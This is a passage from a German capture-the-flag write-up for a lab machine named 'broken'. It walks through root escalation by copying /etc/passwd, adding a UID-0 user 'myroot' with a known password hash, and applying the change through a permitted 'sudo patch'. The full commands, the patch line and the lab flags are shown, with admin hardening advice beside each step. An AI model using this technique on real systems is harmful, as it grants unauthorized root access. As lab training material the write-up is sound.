+             <p class="analysis"><strong>Analyse:</strong> Die aktuelle `/etc/passwd`-Datei wird in das Home-Verzeichnis kopiert, um sie bearbeiten zu können.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erster Schritt zur Vorbereitung der Manipulation der Passwortdatei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit dem Hinzufügen des neuen Root-Benutzers zur kopierten Datei fort.<br><strong>Empfehlung (Admin):</strong> Überwachung von Lese-/Schreibzugriffen auf `/etc/passwd`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">nano passwd</span></div>
+                    <pre>[Datei ./passwd wird bearbeitet: Zeile für 'myroot' mit UID/GID 0 und Passwort-Hash hinzugefügt]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die kopierte Datei `./passwd` wird bearbeitet. Eine Zeile für einen neuen Benutzer `myroot` wird hinzugefügt, der die UID 0 und GID 0 (Root-Rechte) erhält. Ein zuvor generierter Passwort-Hash (für das Passwort `benni`) wird eingefügt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der entscheidende Schritt zur Definition des neuen Root-Benutzers in der bearbeiteten Datei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Syntax der hinzugefügten Zeile korrekt ist. Generieren Sie den Patch.<br><strong>Empfehlung (Admin):</strong> Überwachung von Änderungen an kritischen Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">diff -u /etc/passwd ./passwd > passwd.patch</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `diff`-Befehl wird verwendet, um die Unterschiede zwischen der Originaldatei `/etc/passwd` und der modifizierten Kopie `./passwd` zu ermitteln. Die Ausgabe wird in die Datei `passwd.patch` umgeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erstellt die notwendige Patch-Datei, die nur die Änderung (die neue `myroot`-Zeile) enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie optional den Inhalt von `passwd.patch` mit `cat`. Wenden Sie den Patch an.<br><strong>Empfehlung (Admin):</strong> Grundsätzlich sollten Benutzer keine Schreibrechte auf `/etc/passwd` haben, aber `patch` umgeht dies hier über `sudo`.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cat passwd.patch</span></div>
+                    <pre>
+--- /etc/passwd	2021-05-25 13:49:33.970149704 -0400
++++ ./passwd	2022-09-01 17:31:10.869338295 -0400
+@@ -25,3 +25,4 @@
+ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
++<span class="password">myroot:$6$nhDXnOIiGpLjmzrB$Sh6ro73cyFGTEdbKZnwP9HqVMiMPvS5dpz/Jc6lJxxvjH3H7UVd4fSefXekRNZ3RWK5VzmZjEmTH/z8DhA5kM.:0:0:root:/root:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der erstellten Patch-Datei wird angezeigt. Sie enthält wie erwartet nur die Anweisung, die Zeile für `myroot` hinzuzufügen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigung, dass die Patch-Datei korrekt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Jetzt den Patch mit `sudo patch` anwenden.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu `sudo` und `patch`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">sudo patch -b /etc/passwd < passwd.patch</span></div>
+                    <pre>
+<span class="password">patching file /etc/passwd</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der entscheidende Schritt: Der `patch`-Befehl wird mit `sudo` (als `heart`, der dies darf) ausgeführt, um die Änderungen aus `passwd.patch` auf die Systemdatei `/etc/passwd` anzuwenden. Die Option `-b` erstellt ein Backup der Originaldatei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Meldung `patching file /etc/passwd` signalisiert den Erfolg. Die Systemdatei `/etc/passwd` wurde erfolgreich manipuliert und enthält nun den zusätzlichen Root-Benutzer `myroot`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie mit `su myroot` und dem Passwort `benni` zum neuen Root-Benutzer.<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem gefährlich und sollte sofort entfernt werden. Untersuchen Sie, wie diese Regel zustande kam. Stellen Sie das System aus einem Backup wieder her oder bereinigen Sie die `/etc/passwd` manuell (Backup: `/etc/passwd.orig`).</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">su myroot</span></div>
+                    <pre>
+Password: <span class="password">[Passwort 'benni' eingegeben]</span>
+<span class="prompt" style="color: red;">root@broken:/home/heart#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt" style="color: red;">root@broken:/home/heart#</span> <span class="command">cd /root</span>
+<span class="prompt" style="color: red;">root@broken:~#</span> <span class="command">ls</span>
+<span class="command">flag.sh  r0otfl4g.sh</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `heart` wechselt mit `su myroot` und dem Passwort `benni` erfolgreich zum Benutzer `myroot`. Der `id`-Befehl bestätigt die Root-Rechte (`uid=0`). Anschließend wird in das Root-Verzeichnis (`/root`) gewechselt und dessen Inhalt aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ziel erreicht! Vollständige Root-Rechte wurden erlangt. Die Dateien `flag.sh` und `r0otfl4g.sh` im Root-Verzeichnis enthalten wahrscheinlich die Root-Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flag aus den gefundenen Dateien. Dokumentieren Sie den vollständigen Pfad zur Kompromittierung.<br><strong>Empfehlung (Admin):</strong> System bereinigen, Sicherheitslücken schließen (LFI, schwache Passwörter, unsichere `sudo`-Regeln). Neuinstallation aus einem vertrauenswürdigen Image erwägen.</p>
+
+
+            <!-- Wiederholte Schritte aus einem späteren Versuch/Log -->
+            <p class="analysis"><strong>Analyse (Wiederholung):</strong> Die folgenden Blöcke scheinen eine Wiederholung oder ein erneuter Versuch des Patching-Vorgangs zu sein, möglicherweise aus einem anderen Log oder einer späteren Sitzung. Sie zeigen denselben Ablauf: Kopieren, Bearbeiten (implizit), Diff, Cat, Patch, Su.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cp /etc/passwd ./passwd</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">ls</span></div>
+                     <pre>flag.sh  passwd  user.txt</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">nano passwd</span></div>
+                     <pre>[Datei ./passwd wird bearbeitet]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">diff -u /etc/passwd ./passwd > passwd.patch</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cat passwd.patch</span></div>
+                    <pre>
+--- /etc/passwd	2021-05-25 13:49:33.970149704 -0400
++++ ./passwd	2022-10-09 06:16:54.486443007 -0400
+@@ -25,3 +25,4 @@
+ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
++<span class="password">myroot:$6$nhDXnOIiGpLjmzrB$Sh6ro73cyFGTEdbKZnwP9HqVMiMPvS5dpz/Jc6lJxxvjH3H7UVd4fSefXekRNZ3RWK5VzmZjEmTH/z8DhA5kM.:0:0:root:/root:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">sudo patch -b /etc/passwd < passwd.patch</span></div>
+                    <pre><span class="password">patching file /etc/passwd</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">su myroot</span></div>
+                    <pre>Password: <span class="password">[Passwort 'benni' eingegeben]</span>
+<span class="prompt" style="color: red;">root@broken:/home/heart#</span> <span class="command">ls</span>
+flag.sh  passwd  passwd.patch  user.txt
+<span class="prompt" style="color: red;">root@broken:/home/heart#</span> <span class="command">cd /root</span>
+<span class="prompt" style="color: red;">root@broken:~#</span> <span class="command">ls</span>
+<span class="command">flag.sh  r0otfl4g.sh</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung (Wiederholung):</strong> Diese Blöcke bestätigen den bereits gezeigten Weg zur Root-Eskalation. Die Wiederholung im Log ändert nichts am Ergebnis oder der Methode.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/heart/user.txt</div>
+                     <div class="flag-value"><span class="password">HMVPatchtowin</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/r0otfl4g.sh</div>
+                     <div class="flag-value"><span class="password">HMVPatchedyeah</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 25. Mai 2024</p>
+    </footer>
+</body>
+</html>
